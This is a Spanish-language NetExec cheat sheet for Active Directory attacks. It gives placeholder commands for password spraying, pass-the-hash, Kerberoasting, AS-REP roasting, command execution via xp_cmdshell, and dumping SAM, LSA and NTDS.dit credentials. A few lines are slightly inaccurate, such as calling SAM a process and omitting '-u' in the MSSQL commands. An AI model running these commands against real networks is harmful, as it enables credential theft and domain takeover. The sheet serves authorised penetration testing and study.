// CHEATSHEET

NetExec

Comandos para la enumeración sobre distintos protocolos con NetExec.

Uso Básico

nxc <service> <target> -u <username> -p <password>
nxc <service> <target> -u <username> -H <NT_HASH>

Se puede realizar una enumeracion de credenciales a un servicio en especifico (MSSQL, LDAP, FTP, WINRM, SMB, etc), NetExec tambien permite realizar PtH (-H).

Autenticación

nxc <service> <target> -u '' -p ''

Autenticación nula.

nxc <service> <target> -u <username> -p <password>

Autenticación con el usuario guest, usuario por defecto en Windows.

nxc <service> <target> -u <username> -p <password> --local-auth

Autenticación local, esta sirve para forzar la autenticación contra cuentas locales del sistema operativo (SAM) en vez de cuentas de AD.

nxc smb <target> -u <username> -p <password> -k
nxc ldap <target> --use-kcache

Autenticación utilizando ticket de kerberos.

Enumeración (SMB)

nxc smb <target>

Enumeración basica.

nxc smb <target> -u '' -p '' --shares
nxc smb <target> -u <username> -p <password> --shares

Listar shares.

nxc smb <target> -u '' -p '' --users
nxc smb <target> -u <username> -p <password> --users
nxc smb <target> -u '' -p '' --rid-brute

Listar usuarios.

nxc smb <target> -u users.txt -p <password> --continue-on-success
nxc smb <target> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

Spraying.

Enumeración (LDAP)

nxc ldap <target>

Enumeración basica.

nxc ldap <target> -u '' -p '' --users
nxc ldap <target> -u <username> -p <password> --users

Listar usuarios.

nxc ldap <target> -u <username> -p <password> --bloodhound --dns-server ip --dns-tcp -c all

Extraer información de Active Directory en un formato BloodHound.

nxc ldap <target> -u <username> -p <password> -M ldap-checker

Comprobar el estado de seguridad de LDAP: LDAP Signing y LDAPS Channel Binding, esto con la finalidad de realizar ataques como LDAP Relay.

nxc ldap <target> -u <username> -p <password> --kerberoasting hash.txt
nxc ldap <target> -u <username > -p <password> --asreproast hash.txt

Kerberosting y ASREProast

nxc ldap <target> -u <username> -p <password> -M pre2k

Enumerar cuentas de computadora con la opcion "Assign this computer account as a pre-Windows 2000 computer".

nxc ldap <target> -u <username> -p <password> --find-delegation

Enumerar objetos que que pueden ser abusados para impersonar usuarios (Unconstrained Delegation, Constrained Delegation, Resource-Based Contrained Delegation).

Enumeración (MSSQL)

nxc mssql <target> <username> -p <password>

Autenticación basica.

nxc mssql <target> <username> -p <password> -x command

Ejecutar comandos (xp_cmdshell).

CREDENTIAL DUMPING

La base de datos LSA (HKLM\LSA) y el proceso SAM (HKLM\SAM) contienen usuarios junto a sus hashes.

nxc smb <target> -u <username> -p <password> --lsa
nxc smb <target> -u <username> -p <password> --sam

Esto permite identificar si el usuario que agregamos tiene privilegios para poder realizar el dumping.

NTDS.dit es una base de datos que contiene toda la informacion del dominio.

nxc smb <target> -u <username> -p <password> --ntds

Esto permite identificar si el usuario que agregamos tiene privilegios para poder realizar el dumping.
